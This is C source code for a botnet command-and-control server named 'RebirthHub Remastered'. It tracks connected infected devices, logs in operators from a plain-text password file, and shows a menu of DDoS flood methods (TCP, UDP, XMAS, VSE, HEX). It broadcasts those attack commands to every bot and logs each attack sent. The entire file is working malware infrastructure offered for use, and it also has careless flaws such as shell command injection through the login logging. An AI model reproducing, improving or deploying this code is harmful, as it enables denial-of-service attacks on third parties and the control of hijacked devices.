// RebirthHub Remastered


#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000


struct login_info {
	char username[100];
	char password[100];
};
static struct login_info accounts[100];
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
    char display[100];
    char passw[100];
    char ip[100];
} managements[MAXFDS];
struct telnetListenerArgs {
    int sock;
    uint32_t ip;
};
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}

static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[0;34m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("%s\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
}}}}}}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

int countFileLines(char *filename)
{    
    FILE *fp; 
    int count = 0;
    char c;  

    fp = fopen(filename, "r"); 
  
    if (fp == NULL) 
    { 
        return 0; 
    } 
  
    for (c = getc(fp); c != EOF; c = getc(fp)) 
        if (c == '\n') 
            count = count + 1; 
  
    fclose(fp); 
    return count;
} 
const char *get_host(uint32_t addr)

{

    struct in_addr in_addr_ip;

    in_addr_ip.s_addr = addr;

    return inet_ntoa(in_addr_ip);

}
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; (%d) Devices || (%d) Users %c", '\033', BotsConnected(), OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}	

void *BotWorker(void *sock) {
    struct telnetListenerArgs *args = sock;
    const char *management_ip = get_host(args->ip);
	int datafd = (int)args->sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}	
	
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\x1b[2J\x1b[1;1H");
		char displ [5000]; 
		sprintf(displ, "\x1b[1;30m[ \x1b[1;31m- \x1b[1;30m] \x1b[1;31mRebirthHub \x1b[1;30m[ \x1b[1;31m- \x1b[1;30m]\r\n");
		if(send(datafd, displ, strlen(displ), MSG_NOSIGNAL) == -1) goto end;
		char displ1 [5000]; 
		sprintf(displ1, "\x1b[1;30m[ \x1b[1;31m- \x1b[1;30m] \x1b[1;31mRemastered \x1b[1;30m[ \x1b[1;31m- \x1b[1;30m]\r\n");
		if(send(datafd, displ1, strlen(displ1), MSG_NOSIGNAL) == -1) goto end;
		char user [5000];	
		printf("[%s] - Prompted login\r\n", management_ip);
        sprintf(user, "\x1b[1;31mUsername\x1b[1;30m: ");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [5000];
        sprintf(password, "\x1b[1;31mPassword\x1b[0;30m: ", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		goto Banner;
        }	
        failed:
        goto end;
		Banner:
		pthread_create(&title, NULL, &TitleWriter, datafd);
		char ascii_banner_line10   [5000];
		char ascii_banner_line1   [5000];
		char ascii_banner_line2   [5000];
		char ascii_banner_line3   [5000];
		char ascii_banner_line4   [5000];
		char ascii_banner_line5   [5000];
		char ascii_banner_line6   [5000];
		char ascii_banner_line7   [5000];
		char ascii_banner_line8   [5000];
		char ascii_banner_line11   [5000];
        sprintf(managements[datafd].display, "%s", accounts[find_line].username);       
        sprintf(managements[datafd].passw, "%s", accounts[find_line].password);       
        sprintf(managements[datafd].ip, "%s", management_ip);   
        printf("[%s %s %s] - Logged in\r\n", managements[datafd].display,managements[datafd].passw,managements[datafd].ip);
        char *logfile[60];
        sprintf(logfile, "echo '%s - %s' >> loginLogs", managements[datafd].display, managements[datafd].ip);
        system(logfile);   

		sprintf(ascii_banner_line11,   "\x1b[2J\x1b[1;1H \r\n");
		sprintf(ascii_banner_line10,   "\r\n");
		sprintf(ascii_banner_line1,   "                    \x1b[1;30m[ \x1b[1;31m- - - - - \x1b[1;30m] \x1b[1;31m(\x1b[1;36mRebirthHub\x1b[1;31m) \x1b[1;30m[ \x1b[1;31m- - - - - \x1b[1;30m]\x1b[0m\r\n"); 
		sprintf(ascii_banner_line2,   "                     \x1b[1;30m[ ] [ [ \x1b[1;36m- \x1b[1;30m] ] \x1b[1;31m---------- \x1b[1;30m[ [ \x1b[1;36m- \x1b[1;30m] ] [ ]\x1b[0m  \r\n"); 
		sprintf(ascii_banner_line3,   "                      \x1b[1;36m-  \x1b[1;30m[ [ \x1b[1;31m- \x1b[1;30m] ] \x1b[1;36mRemastered \x1b[1;30m[ [ \x1b[1;31m- \x1b[1;30m] ] \x1b[1;36m -\x1b[0m  \r\n"); 
		sprintf(ascii_banner_line4,   "                     \x1b[1;30m[ ] [ [ \x1b[1;36m- \x1b[1;30m] ] \x1b[1;31m---------- \x1b[1;30m[ [ \x1b[1;36m- \x1b[1;30m] ] [ ]\x1b[0m  \r\n"); 
		sprintf(ascii_banner_line5,   "                    \x1b[1;30m[ - \x1b[1;30m[ \x1b[1;31m! \x1b[1;30m] - \x1b[1;30m] \x1b[1;36mSelfRepNetiS \x1b[1;30m[ - \x1b[1;30m[ \x1b[1;31m! \x1b[1;30m] - \x1b[1;30m] \x1b[0m   \r\n"); 
		sprintf(ascii_banner_line6,   "\x1b[0m  \r\n"); 
		sprintf(ascii_banner_line7,   "\x1b[0m                          \r\n");
		sprintf(ascii_banner_line8,   " \r\n"); 

 
		if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;

		while(1) {
		char input [5000];
        sprintf(input, "\x1b[1;31m%s\x1b[1;30m[\x1b[1;36m-\x1b[1;30m]\x1b[1;31mRebirth \x1b[1;36m>  ", managements[datafd].display);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, datafd);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
			if (strncmp(buf, "HELP", 4) == 0 || strncmp(buf, "help", 4) == 0 || strncmp(buf, "?", 4) == 0) {
				sprintf(botnet,  "\x1b[1;31m[ \x1b[1;30m - - - \x1b[1;36mRebirth Hub Method Menu \x1b[1;30m - - - \x1b[1;31m]\r\n");
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;          
				sprintf(botnet,  " \x1b[1;31m[ \x1b[1;36m!* TCP IP PORT TIME 32 all 512 10 \x1b[1;31m]\r\n");
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;          
				sprintf(botnet,  "  \x1b[1;31m[ \x1b[1;36m!* UDP IP PORT TIME 32 1460 10  \x1b[1;31m]\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;          
				sprintf(botnet,  "  \x1b[1;31m[ \x1b[1;36m!* XMAS IP PORT TIME 32 1250 10 \x1b[1;31m]  \r\n");
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;          
				sprintf(botnet,  "    \x1b[1;31m[ \x1b[1;36m!* VSE IP PORT TIME 32 0 10 \x1b[1;31m]\r\n");
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;          
				sprintf(botnet,  "     \x1b[1;31m[ \x1b[1;36m!* HEX IP PORT TIME PSIZE\x1b[1;31m ]\r\n");
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;          
				sprintf(botnet,  "\x1b[1;31m[ \x1b[1;36m- - - - - - - - - - - - - - - - - - \x1b[1;31m]\r\n");       
				sprintf(botnet,  "\x1b[1;31m[ \x1b[1;36maccount \x1b[1;31m]\r\n");
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;       
				sprintf(botnet,  "\x1b[1;31m[ \x1b[1;36mserver \x1b[1;31m]\r\n");
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;    
				sprintf(botnet,  "\x1b[1;31m[ \x1b[1;36monline \x1b[1;31m]\r\n");
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;      
			}
			if (strncmp(buf, "ACCOUNT", 7) == 0 || strncmp(buf, "account", 7) == 0 || strncmp(buf, "acc", 3) == 0) {
				pthread_create(&title, NULL, &TitleWriter, datafd);
	            sprintf(botnet, "\x1b[1;31m- \x1b[1;37mYour account details below \x1b[1;31m-\r\n");
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;          
	            sprintf(botnet, "\x1b[1;31mUsername: [\x1b[1;37m%s\x1b[1;31m]\r\n", managements[datafd].display);
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;         
	            sprintf(botnet, "\x1b[1;31mPassword: [\x1b[1;37m%s\x1b[1;31m]\r\n", managements[datafd].passw);
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;   
	            sprintf(botnet, "\x1b[1;31mIP: [\x1b[1;37m%s\x1b[1;31m]\r\n", managements[datafd].ip);
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;  
	        } 
	        if(strstr(buf, "online"))
	        {
                int k;
                strcpy(botnet, "\x1b[1;31m- \x1b[1;37mAll online users \x1b[1;31m-\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                for(k=0; k < MAXFDS; k++)
                {
                    if(strlen(managements[k].display) > 1 && managements[k].connected == 1)
                    {
                        sprintf(botnet, "\x1b[1;31mIdentifier: [\x1b[1;37m%d\x1b[1;31m] \x1b[1;36m|| \x1b[1;31mUsername: [\x1b[1;37m%s\x1b[1;31m]\r\n", k, managements[k].display);
                        if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
	        }   
			if(strstr(buf, "server")) {
	            sprintf(botnet, "\x1b[1;36m- \x1b[1;31m[ \x1b[1;37mCnC Stats\x1b[1;31m ] \x1b[1;36m-\r\n");   
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;   
	            sprintf(botnet, "\x1b[1;36m- \x1b[1;31mGlobal attacks sent: [\x1b[1;37m%d\x1b[1;31m] \x1b[1;36m-\r\n", countFileLines("attks"));
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;   
	            sprintf(botnet, "\x1b[1;36m- \x1b[1;31mRegistered users: [\x1b[1;37m%d\x1b[1;31m] \x1b[1;36m-\r\n", countFileLines("login.txt"));           
	            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;   
	 		}
             		
			if (strncmp(buf, "CLEAR", 5) == 0 || strncmp(buf, "clear", 5) == 0 || strncmp(buf, "cls", 3) == 0 || strncmp(buf, "CLS", 3) == 0) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
  				if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
				while(1) {
					char input [5000];
			        sprintf(input, "\x1b[1;31m%s\x1b[1;30m[\x1b[1;36m-\x1b[1;30m]\x1b[1;31mRebirth \x1b[1;36m>  ", managements[datafd].display);
					if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
					break;
				}
				continue;
			}
            trim(buf);
			char input [5000];
        	sprintf(input, "\x1b[1;31m%s\x1b[1;30m[\x1b[1;36m-\x1b[1;30m]\x1b[1;31mRebirth \x1b[1;36m>  ", managements[datafd].display);
			if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("%s - %s\n",managements[datafd].display, buf);

			FILE *LogFile;
            LogFile = fopen("log", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);

			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "%s - INFO - %s - %s\n", formatted_gmt, managements[datafd].display, buf);
            fclose(LogFile);
            if(strstr(buf, "HEX") || strstr(buf, "UDP") || strstr(buf, "VSE") || strstr(buf, "XMAS") || strstr(buf, "TCP") || strstr(buf, "STOP"))
			{
                trim(buf);
                LogFile = fopen("attks", "a");
                fprintf(LogFile, "%s: \"%s\"\n",managements[datafd].display, buf);
                fclose(LogFile);   
	            broadcast(buf, datafd, managements[datafd].display);
			    memset(buf, 0, 2048);
			}
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}
void *BotListener(int port) {
        int sockfd, newsockfd;

        struct epoll_event event;

        socklen_t clilen;

        struct sockaddr_in serv_addr, cli_addr;

        sockfd = socket(AF_INET, SOCK_STREAM, 0);

        if (sockfd < 0) perror("ERROR opening socket");

        bzero((char *) &serv_addr, sizeof(serv_addr));

        serv_addr.sin_family = AF_INET;

        serv_addr.sin_addr.s_addr = INADDR_ANY;

        serv_addr.sin_port = htons(port);

        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");

        listen(sockfd,5);

        clilen = sizeof(cli_addr);

        while (1)

        {

            newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, &clilen);

            if (newsockfd < 0) perror("ERROR on accept");

        

            struct telnetListenerArgs args;

            args.sock = newsockfd;

            args.ip = ((struct sockaddr_in *)&cli_addr)->sin_addr.s_addr;



            pthread_t thread;

            pthread_create(&thread, NULL, &BotWorker, (void *)&args);

        }
}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
        printf("\x1b[1;31mC2 Status: \x1b[1;32mOnline\r\n");
        printf("\x1b[1;31mAll Devices sent to [\x1b[1;37m%s\x1b[1;31m] backed behinds [\x1b[1;37m%s\x1b[1;31m] threads\r\n", argv[1], argv[2]);
        printf("\x1b[1;31mCNC Traffic to: [\x1b[1;37m%s\x1b[1;31m]\r\n", argv[3]);
		port = atoi(argv[3]);
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}